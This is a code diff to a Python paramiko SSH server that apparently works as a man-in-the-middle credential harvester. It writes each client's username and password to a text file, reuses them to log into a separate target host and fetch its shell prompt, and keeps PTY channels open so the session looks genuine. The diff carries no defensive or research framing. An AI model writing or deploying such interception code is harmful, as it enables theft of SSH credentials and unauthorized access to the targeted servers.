@@ -7,6 +7,8 @@ import paramiko
 from paramiko.util import u
 from base64 import decodebytes
 
+import time
+
 def on_connect(chan, addr, server):
     print(f"Connection from {addr}")
 
@@ -35,6 +37,8 @@ class Server(paramiko.ServerInterface):
         self.client_transport = client_transport
         self.target_host = target_host
         self.target_port = target_port
+        self.is_channel_exec_request = False
+        self.channel = None
         self.target_transport = None
 
         self.event = threading.Event()
@@ -43,6 +47,27 @@ class Server(paramiko.ServerInterface):
         if kind == "session":
             return paramiko.OPEN_SUCCEEDED
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+    def get_target_prompt(self, username, password):
+        buffer_size = 1000
+        with paramiko.SSHClient() as ssh:
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(self.target_host, self.target_port, username, password, timeout=20)
+            connection = ssh.invoke_shell()
+            
+            time.sleep(2)  
+            while connection.recv_ready():
+                connection.recv(buffer_size)
+            connection.sendall('\n')
+
+            time.sleep(.3)
+            data = str(connection.recv(buffer_size), encoding='utf-8').strip()
+            while connection.recv_ready():
+                connection.recv(buffer_size)  
+            
+            return data
+
+
 
     def check_auth_password(self, username, password):
 
@@ -57,6 +82,8 @@ class Server(paramiko.ServerInterface):
 
             with open('user.txt', 'a') as f:
                 f.write(f"{username}: {password}\n")
+
+            self.target_prompt = self.get_target_prompt(username, password)
 
             return paramiko.AUTH_SUCCESSFUL
 
@@ -96,8 +123,7 @@ class Server(paramiko.ServerInterface):
     def check_channel_pty_request(
         self, channel, term, width, height, pixelwidth, pixelheight, modes
     ):
-        
-        channel.close()
+        self.channel = channel
         self.event.set()
 
         return True
@@ -107,6 +133,7 @@ class Server(paramiko.ServerInterface):
         return True
     
     def check_channel_exec_request(self, channel, command):
+        self.is_channel_exec_request = True
         try:
             res = self.exec_command(channel, command)
             channel.send_exit_status(res.returncode)
@@ -142,8 +169,6 @@ class Server(paramiko.ServerInterface):
             target_session.close()
 
             channel.send_exit_status(exit_status)
-
-            channel.close()
 
             # Close the session on the target server
         
